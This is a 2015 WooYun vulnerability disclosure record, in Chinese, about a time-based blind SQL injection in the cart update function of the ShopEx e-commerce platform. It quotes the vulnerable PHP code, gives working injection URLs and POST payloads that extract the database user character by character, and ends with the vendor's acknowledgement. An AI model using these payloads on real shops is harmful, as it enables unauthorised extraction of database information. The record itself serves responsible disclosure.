{"id": 40840, "wybug_id": "wooyun-2015-097073", "wybug_title": "ShopEx某处SQL注入（可猜测敏感信息）", "wybug_corp": "ShopEx", "wybug_author": "menmen519", "wybug_date": "2015-02-13 13:42", "wybug_open_date": "2015-05-14 15:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： ShopEx sql注入 详细说明：  分析一下代码：ctl.cart.php:\nfunction updateCart($objType='g', $key=''){    \t        $key = str_replace('@', '-', $key);               $nQuantity = $_POST['cartNum'][$objType][$key];               switch($objType) {            case 'f':                $oCart->member['member_lv_id'] =$GLOBALS['runtime']['member_lv'];                $oCart->member['point'] = $this->member['point'];                break;            case 'g':                break;            case 'p':                break;            default:                break;        }               if(!$this->objCart->updateCart($objType, $key, $nQuantity,$aError)){            echo implode('',$aError);        }else{            $this->cartTotal();        }    }\n这里对传递进来的$key进行了分解，分解完毕之后然后updateCart，如果updateCart结果不成立然后就cartTotal\nfunction cartTotal(){        $this->ctl_cart();        $sale = &$this->system->loadModel('trading/sale');        $trading = $sale->getCartObject($this->cart,$GLOBALS['runtime']['member_lv'],true);        $this->pagedata['trading'] = &$trading;        $this->__tmpl = 'cart/cart_total.html';        $this->output();    }\n这里进行了获取操作，因为shopex是加密的，部分解密分析了一下，这里我们直接看sql后台抓到的语句发送url:http://localhost/shopex/?cart-g-2@100) or if(ascii(mid(user(),1,1))rlike(115),sleep(1%2f10),1)%23@na-updateCart.htmlpostdata：cartNum[g][2-100) or if(ascii(mid(user(),1,1))rlike(115),sleep(1%2f10),1)#-na]=123我系统是root@localhost用户所以第一个字母的ascii应该为114，这里首先我们给出115使其不成立\n\n造成566毫秒然后改为114，发送url前清空cookie，不然会造成过滤url:http://localhost/shopex/?cart-g-2@100) or if(ascii(mid(user(),1,1))rlike(114),sleep(1%2f10),1)%23@na-updateCart.htmlpostdata:cartNum[g][2-100) or if(ascii(mid(user(),1,1))rlike(114),sleep(1%2f10),1)#-na]=123\n\n造成3.85秒延迟 这里解释一下为什么秒数为1/10 因为这里是一个join操作，每查询一次就会sleep一下，故而不能设置sleep过大 ，不然造成数据库挂掉了后台抓取sql语句为SELECT p.*,t.setting,g.score,g.brand_id,g.cat_id,g.type_id,g.image_default,g.thumbnail_pic                    FROM sdb_products AS p                    LEFT JOIN sdb_goods AS g ON p.goods_id=g.goods_id                    LEFT JOIN sdb_goods_type AS t ON g.type_id=t.type_id                    WHERE p.product_id IN (100) or if(ascii(mid(user(),1,1))rlike(114),sleep(1/10),1)#)看到给的payload 就可以进行猜测敏感信息   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-02-13 14:58 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}